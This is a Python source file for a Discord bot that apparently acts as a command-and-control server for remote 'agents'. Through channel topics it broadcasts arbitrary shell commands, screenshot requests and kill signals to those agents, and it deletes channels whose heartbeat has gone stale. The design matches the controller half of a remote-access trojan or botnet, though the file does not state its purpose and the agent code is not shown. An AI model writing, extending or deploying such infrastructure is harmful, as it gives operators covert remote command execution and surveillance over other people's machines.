import discord
from discord.ext import commands, tasks
import os
import asyncio
from aiohttp import web
from datetime import datetime, timezone, timedelta
import re
import logging

# ------------------- CONFIGURATION (from environment) -------------------
BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
GUILD_ID = int(os.getenv("DISCORD_GUILD_ID", 0))
CONTROL_CHANNEL_NAME = os.getenv("CONTROL_CHANNEL", "control")
AGENT_CHANNEL_PREFIX = os.getenv("AGENT_PREFIX", "agent-")
STALE_THRESHOLD_MINUTES = int(os.getenv("STALE_THRESHOLD_MINUTES", 5))
PORT = int(os.getenv("PORT", 10000))

if not BOT_TOKEN:
    raise ValueError("DISCORD_BOT_TOKEN environment variable not set")
if not GUILD_ID:
    raise ValueError("DISCORD_GUILD_ID environment variable not set")

# ------------------- LOGGING SETUP -------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("bot")

# ------------------- BOT SETUP -------------------
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

# ------------------- RATE LIMIT RETRY HELPER -------------------
async def set_topic_with_retry(channel, topic, max_retries=3):
    """Attempt to set channel topic, handling rate limits with exponential backoff."""
    for attempt in range(max_retries):
        try:
            await channel.edit(topic=topic)
            logger.info(f"✅ Topic set to '{topic}' in #{channel.name}")
            return True
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = int(e.response.headers.get("Retry-After", 5))
                logger.warning(f"⏳ Rate limited (attempt {attempt+1}/{max_retries}), waiting {retry_after}s")
                await asyncio.sleep(retry_after)
            else:
                logger.error(f"❌ HTTP error setting topic: {e.status} - {e.text}")
                raise
    logger.error(f"❌ Failed to set topic after {max_retries} attempts")
    return False

# ------------------- HTTP HEALTH SERVER (for Render) -------------------
async def handle_health(request):
    return web.Response(text="OK")

app = web.Application()
app.router.add_get("/", handle_health)
app.router.add_get("/health", handle_health)

async def start_http_server():
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logger.info(f"Health check server running on port {PORT}")

# ------------------- BACKGROUND CLEANUP TASK -------------------
@tasks.loop(minutes=1)
async def clean_stale_agents():
    guild = bot.get_guild(GUILD_ID)
    if not guild:
        return

    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
    now = datetime.now(timezone.utc)

    for channel in agent_channels:
        try:
            async for msg in channel.history(limit=10, oldest_first=True):
                if msg.author == bot.user and "**Last seen:**" in msg.content:
                    match = re.search(r"\*\*Last seen:\*\*\s*([^\n]+)", msg.content)
                    if not match:
                        logger.info(f"Deleting {channel.name} (no timestamp)")
                        await channel.delete()
                        break
                    timestamp_str = match.group(1).strip()
                    try:
                        last_seen = datetime.fromisoformat(timestamp_str.replace('Z', '+00:00'))
                        if now - last_seen > timedelta(minutes=STALE_THRESHOLD_MINUTES):
                            logger.info(f"Deleting {channel.name} (stale, last seen {last_seen})")
                            await channel.delete()
                    except Exception as e:
                        logger.error(f"Timestamp parse error for {channel.name}: {e}")
                        await channel.delete()
                    break
            else:
                logger.info(f"Deleting {channel.name} (no heartbeat message)")
                await channel.delete()
        except discord.Forbidden:
            logger.warning(f"No permission to read history in {channel.name}")
        except Exception as e:
            logger.error(f"Error processing {channel.name}: {e}")

@clean_stale_agents.before_loop
async def before_clean_stale_agents():
    await bot.wait_until_ready()

# ------------------- DISCORD EVENTS -------------------
@bot.event
async def on_ready():
    logger.info(f"Logged in as {bot.user}")
    guild = bot.get_guild(GUILD_ID)
    if guild:
        control = discord.utils.get(guild.channels, name=CONTROL_CHANNEL_NAME)
        if not control:
            await guild.create_text_channel(CONTROL_CHANNEL_NAME)
            logger.info(f"Created #{CONTROL_CHANNEL_NAME} channel")
    clean_stale_agents.start()

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if message.guild.id != GUILD_ID:
        return
    await bot.process_commands(message)

# ------------------- CONTROL CHANNEL COMMANDS -------------------
@bot.command(name="agents", help="List all active agents")
async def list_agents(ctx):
    if ctx.channel.name != CONTROL_CHANNEL_NAME:
        await ctx.send("This command can only be used in the #control channel.")
        return
    guild = ctx.guild
    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
    if not agent_channels:
        await ctx.send("No agents currently connected.")
        return
    embed = discord.Embed(title="Active Agents", color=0x00ff00)
    for ch in agent_channels:
        async for msg in ch.history(limit=10):
            if msg.author == bot.user and "**Last seen:**" in msg.content:
                embed.add_field(name=f"#{ch.name}", value=msg.content[:200], inline=False)
                break
        else:
            embed.add_field(name=f"#{ch.name}", value="No heartbeat", inline=False)
    await ctx.send(embed=embed)

@bot.command(name="broadcast", help="Send a command to all agents")
async def broadcast(ctx, *, command):
    if ctx.channel.name != CONTROL_CHANNEL_NAME:
        await ctx.send("This command can only be used in the #control channel.")
        return
    guild = ctx.guild
    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
    if not agent_channels:
        await ctx.send("No agents to broadcast to.")
        return
    for ch in agent_channels:
        await ch.edit(topic=f"cmd:run {command}")
    await ctx.send(f"Broadcast command `{command}` to {len(agent_channels)} agents.")

@bot.command(name="killall", help="Kill all agents")
async def kill_all(ctx):
    if ctx.channel.name != CONTROL_CHANNEL_NAME:
        await ctx.send("This command can only be used in the #control channel.")
        return
    guild = ctx.guild
    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
    for ch in agent_channels:
        await ch.edit(topic="cmd:kill")
    await ctx.send(f"Kill signal sent to {len(agent_channels)} agents.")

# ------------------- AGENT CHANNEL COMMAND LISTENER -------------------
@bot.listen()
async def on_message(message):
    print(f"🔵 DEBUG: Message received in #{message.channel.name} from {message.author}: {message.content}")
    if message.author == bot.user:
        return
    if message.guild.id != GUILD_ID:
        return
    if not message.channel.name.startswith(AGENT_CHANNEL_PREFIX):
        return

    content = message.content.strip()
    logger.info(f"📩 Agent channel message: {content} in #{message.channel.name}")

    try:
        if content.startswith("!run "):
            cmd = content[5:].strip()
            success = await set_topic_with_retry(message.channel, f"cmd:run {cmd}")
            if success:
                await message.add_reaction("✅")
            else:
                await message.channel.send("❌ Failed to send command after retries.")
        elif content == "!screenshot":
            success = await set_topic_with_retry(message.channel, "cmd:screenshot")
            if success:
                await message.add_reaction("✅")
            else:
                await message.channel.send("❌ Failed to send command after retries.")
        elif content == "!kill":
            success = await set_topic_with_retry(message.channel, "cmd:kill")
            if success:
                await message.add_reaction("✅")
            else:
                await message.channel.send("❌ Failed to send command after retries.")
        else:
            logger.debug(f"Ignored non-command: {content}")
    except Exception as e:
        logger.exception(f"Unhandled exception in listener: {e}")
        await message.channel.send("❌ Internal bot error.")

# ------------------- MAIN -------------------
async def main():
    asyncio.create_task(start_http_server())
    await bot.start(BOT_TOKEN)

if __name__ == "__main__":
    asyncio.run(main())
